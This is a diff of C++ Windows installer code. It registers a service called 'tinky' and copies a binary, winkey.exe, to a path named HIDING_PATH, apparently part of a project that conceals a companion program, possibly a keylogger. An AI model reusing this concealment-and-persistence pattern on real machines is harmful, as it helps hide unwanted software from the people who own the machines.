@@ -31,6 +31,7 @@ static BYTE createService(void) {
 		NULL, NULL, NULL, NULL, NULL
 	);
 	if (!tinky.serviceHandler) {
+		cerr	<< "Failed to create service...\n";
 		if (GetLastError() == ERROR_SERVICE_EXISTS)
 			cerr	<< "Service tinky already exist\n";
 		return (FAILURE);
@@ -41,18 +42,23 @@ static BYTE createService(void) {
 static BYTE movWinkey(void) {
 	wstring processPath = getServicePath(L"winkey");
 
-	if (!MoveFileExW(
-			processPath.c_str(), 
-			HIDING_PATH, 
-			MOVEFILE_REPLACE_EXISTING
+	if (!CopyFileW(
+			processPath.c_str(),
+			HIDING_PATH,
+			FALSE
 		)) {
-		cerr << "Failed to move winkey.exe... error code: "<< GetLastError() <<  "\n";
+
+		cerr	<< "Can't move winkey.exe... error code: "<< GetLastError()
+				<< "Failed to create service...\n"
+				<< "\n";
+
 		return (FAILURE);
 	}
 	return (SUCCESS);
 }
 
 int install(void) {
+	cout	<< "Installing service...\n";
 	if (!movWinkey())
 		return (FAILURE);
 	if (!createService())
